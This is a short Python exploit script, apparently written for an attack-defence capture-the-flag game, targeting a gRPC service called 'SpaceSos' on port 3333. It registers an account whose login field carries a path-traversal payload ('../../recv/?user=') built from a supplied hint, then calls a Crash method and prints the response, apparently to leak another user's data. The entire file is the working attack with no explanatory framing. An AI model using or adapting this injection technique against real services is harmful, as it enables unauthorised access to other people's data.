#!/usr/bin/env python3
import secrets

import grpc
import sys

import spacesos_pb2_grpc
import spacesos_pb2

ip = sys.argv[1]
hint = sys.argv[2]

chan = grpc.insecure_channel('{}:3333'.format(ip))
stub = spacesos_pb2_grpc.SpaceSosStub(chan)

u = hint
payload = "{}/../../recv/?user={}".format(secrets.token_hex(12), u)
sessionId = stub.Register(spacesos_pb2.AuthRequest(login=payload, password='somepassword'))
print(stub.Crash(spacesos_pb2.CrashRequest(sessionId=sessionId.sessionId, crash=spacesos_pb2.Crash())), flush=True)

